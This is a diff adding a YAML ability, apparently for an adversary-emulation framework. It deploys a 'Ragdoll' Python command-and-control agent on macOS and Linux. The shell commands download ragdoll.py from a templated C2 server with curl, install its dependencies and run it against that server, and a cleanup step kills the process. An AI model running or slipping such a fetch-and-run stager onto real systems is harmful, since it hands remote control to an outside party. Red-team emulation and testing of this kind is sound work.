@@ -1,0 +1,26 @@
+- id: 0ab383be-b819-41bf-91b9-1bd4404d83bf
+  name: Ragdoll
+  description: A Python agent which communicates via the HTML contact
+  tactic: command-and-control
+  technique:
+    attack_id: T1071.001
+    name: "Application Layer Protocol: Web Protocols"
+  platforms:
+    darwin:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
+          pip install requests beautifulsoup4;
+          python ragdoll.py -W $server#{app.contact.html}
+        cleanup: |
+          pkill -f ragdoll
+    linux:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" $server/file/download > ragdoll.py;
+          pip install requests beautifulsoup4;
+          python ragdoll.py -W $server#{app.contact.html}
+        cleanup: |
+          pkill -f ragdoll
